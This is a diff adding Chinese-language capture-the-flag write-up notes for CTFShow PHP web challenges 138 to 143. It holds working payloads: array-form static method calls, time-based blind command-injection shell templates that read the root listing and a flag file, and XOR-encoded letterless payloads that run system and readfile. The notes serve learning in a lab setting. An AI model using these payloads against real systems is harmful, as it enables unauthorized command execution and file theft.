@@ -305,3 +305,89 @@ sed 's/旧内容/新内容/' file.txt
 -------
 
 POST:ctfshow=ctfshow::getFlag
+
+
+## 138
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783822673030_image.png)
+`strripos`以不区分大小写的方式查找指定字符串在目标字符串中最后一次出现的位置。
+与 `strrpos() `不同，`strripos() `不区分大小写,`strrpos()`区分大小写
+
+也就是说`:`被禁用了
+
+call-user-func还支持数组形式的请求
+
+```
+在 PHP 里，数组形式的 请求 有两种常见写法：
+[$object, 'methodName']     // 调用对象方法
+['ClassName', 'methodName'] // 调用静态方法
+```
+
+payload：`ctfshow[0]=ctfshow&ctfshow[1]=getFlag`数组形式调用静态方法 
+
+
+
+## 139
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783824304169_image.png)
+与136很像，这一题需要命令盲注
+[脚本](xobear.cn\CTF\Web\PHP\139.py)
+
+
+```if [ `ls / -1 |cut -c {} | awk \"NR=={}\"`  ==  \"{}\" ];then sleep 4;fi```
+```if [ `cat /f149_15_h3r3 |cut -c {} `  ==  \"{}\" ];then sleep 4;fi```
+
+其中`ls / -1`将根目录竖列排出，`cut -c ` 截取指定字符 ``awk "NR=={}"``读取的列数（行号）
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784013055971_image.png)
+
+
+## 140
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784013598313_image.png)
+
+`f1=system&f2=system`
+
+`f1=getdate&f2=getdate`
+
+`f1=usleep&f2=usleep`
+
+都可以。弱比较，左边是数字，右边的非数字会被转换为数字0
+
+主要目的就是让`intval（$code）`=0
+`PHP 8 改了这类弱比较规则，0 == 'ctfshow' 不再成立`
+
+## 141
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784069699645_image.png)
+`^\w+$`表示在开头和末尾匹配字母数字_，传入的v3值不能有字母数字_，即无字母的命令执行
+
+绕过return 应该说运算符都可以绕过 。只是把 payload 和前后的 1 连成一个合法表达式，让 PHP 在 return 前必须先计算它。
+`?
+v1=1&v2=1&v3=("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")('%03%01%08%01%06%01'^'%60%60%7C%21%60%2B');`
+
+## 142
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784072456693_image.png)
+
+V1=0
+
+
+## 143
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784073275904_image.png)
+过滤了取反,+,-等符号，还可以用 或 异或 等运算 加上 *
+
+`?v1=1&v2=2&v3=%2A%28%28%27%29%3E%21%3A%3D%29%2C%3E%27%5E%27%5B%5B%40%5E%5B%40%40%5B%27%29%28%27%3D%2C%21%3A%20%60%28%60%27%5E%27%5B%40%40%5D%0E%10%40%10%27%29%29%2A`
+=》`readfile("flag.php")`
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
